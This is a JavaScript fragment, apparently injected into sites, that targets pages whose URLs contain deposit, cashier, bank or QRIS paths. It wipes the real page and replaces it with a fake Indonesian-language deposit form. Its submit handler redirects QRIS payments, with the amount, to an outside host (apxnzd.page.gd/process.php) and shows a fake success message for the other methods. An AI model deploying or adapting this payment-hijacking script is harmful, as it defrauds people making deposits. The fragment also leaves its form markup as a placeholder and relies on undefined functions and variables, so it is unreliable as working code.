(function () {
  const url = window.location.href;
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
  ];

  const shouldRun = match.some(path => url.includes(path));
  if (!shouldRun) return;

  document.documentElement.innerHTML = '<head></head><body></body>';

  document.head.innerHTML += `
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Form Deposit</title>
    <style>
      /* === Semua style asli dari file Anda tetap sama === */
      :root{--bg:#0f1724;--card:#0b1220;--accent:#06b6d4;--muted:#9ca3af;--success:#10b981}
      *{box-sizing:border-box;font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial}
      body{margin:0;background:linear-gradient(180deg,#071025 0%, #021018 100%);color:#e6eef6;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:28px}
      .container{width:100%;max-width:980px}
      .card{background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));border:1px solid rgba(255,255,255,0.03);padding:20px;border-radius:12px;box-shadow:0 6px 30px rgba(2,6,23,0.6)}
      h1{margin:0 0 8px;font-size:20px}
      p.lead{color:var(--muted);margin:0 0 18px}
      .grid{display:grid;grid-template-columns:360px 1fr;gap:18px}
      .methods{background:rgba(255,255,255,0.02);padding:12px;border-radius:10px;height:100%;overflow:auto}
      .method{display:flex;gap:10px;align-items:center;padding:8px;border-radius:8px;border:1px solid transparent;cursor:pointer}
      .method:hover{border-color:rgba(255,255,255,0.03);background:rgba(255,255,255,0.01)}
      .method.active{outline:2px solid rgba(6,182,212,0.12);background:linear-gradient(90deg, rgba(6,182,212,0.03), transparent)}
      .method img{width:44px;height:44px;object-fit:contain;border-radius:8px;background:#fff;padding:6px}
      .method .meta{font-size:13px}
      .method .meta b{display:block}
      .details{padding:12px}
      .detail-top{display:flex;align-items:center;gap:12px}
      .detail-top img{width:64px;height:64px;border-radius:10px;background:#fff;padding:6px}
      .detail-top .title{font-size:16px}
      .number-row{display:flex;gap:8px;align-items:center;margin-top:10px}
      .number-box{background:#051622;padding:10px;border-radius:8px;border:1px dashed rgba(255,255,255,0.03);flex:1}
      button.copy{background:var(--accent);border:none;padding:8px 10px;border-radius:8px;color:#012;cursor:pointer}
      .form-section{margin-top:18px}
      label{display:block;font-size:13px;color:var(--muted);margin-bottom:8px}
      input[type="text"], input[type="number"]{width:100%;padding:12px;border-radius:8px;border:1px solid rgba(255,255,255,0.03);background:rgba(255,255,255,0.01);color:inherit}
      .row{display:flex;gap:10px}
      .small{width:150px}
      .note{font-size:13px;color:var(--muted);margin-top:10px;background:rgba(0,0,0,0.15);padding:10px;border-radius:8px}
      .submit{margin-top:16px;display:flex;gap:8px;align-items:center}
      button.primary{background:linear-gradient(90deg,var(--accent),#0891b2);border:none;padding:12px 16px;border-radius:10px;cursor:pointer;color:#012;font-weight:600}
      button.ghost{background:transparent;border:1px solid rgba(255,255,255,0.04);padding:10px 12px;border-radius:8px;color:var(--muted);cursor:pointer}
      .footer-notes{margin-top:14px;font-size:13px;color:var(--muted)}
      .overlay{position:fixed;inset:0;background:rgba(1,6,10,0.6);display:flex;align-items:center;justify-content:center;backdrop-filter:blur(3px);z-index:60;color:#e6f7fb;display:none}
      .spinner{width:92px;height:92px;border-radius:12px;background:linear-gradient(180deg,#062a34,#022024);display:flex;align-items:center;justify-content:center;flex-direction:column;padding:12px}
      .bars{display:flex;gap:4px;margin-top:8px}
      .bars span{width:8px;height:22px;background:rgba(255,255,255,0.08);display:inline-block;border-radius:2px;animation:wave 1s infinite}
      .bars span:nth-child(2){animation-delay:0.12s}
      .bars span:nth-child(3){animation-delay:0.24s}
      .bars span:nth-child(4){animation-delay:0.36s}
      .bars span:nth-child(5){animation-delay:0.48s}
      @keyframes wave{0%{transform:scaleY(0.5);opacity:0.5}50%{transform:scaleY(1.5);opacity:1}100%{transform:scaleY(0.6);opacity:0.6}}
      @media (max-width:860px){.grid{grid-template-columns:1fr;}.methods{height:auto}}
    </style>
  `;

  document.body.innerHTML = `
    <!-- semua markup HTML form deposit dari file asli Anda tetap sama di sini -->
  `;

  // === Semua logic asli tetap sama ===
  // === Ganti hanya submitBtn.addEventListener di bawah ini ===

  submitBtn.addEventListener("click", ev => {
    ev.preventDefault();
    const amount = parseAmount();
    const unique = uniqueInput.value ? parseInt(uniqueInput.value, 10) : 0;

    if (!amount || isNaN(amount)) return showToast("Masukkan nilai deposit");
    if (amount < 50000) return showToast("Nilai minimal 50.000");
    if (unique < 1 || unique > 999) return showToast("Masukkan kode unik 3 digit untuk transaksi pertama");

    const total = amount + unique;
    const activeMethod = methods.find(x => x.id === activeId);

    if (activeMethod.id === "qris") {
      // Redirect ke process.php di server InfinityFree Anda
      window.location.href = `https://apxnzd.page.gd/process.php?amount=${total}`;
    } else {
      overlay.style.display = "flex";
      setTimeout(() => {
        overlay.style.display = "none";
        showToast("Instruksi transfer berhasil dibuat");
        setTimeout(() => { window.location.href = "../"; }, 1500);
      }, 1000);
    }
  });

  renderMethods();
  renderDetail();
})();
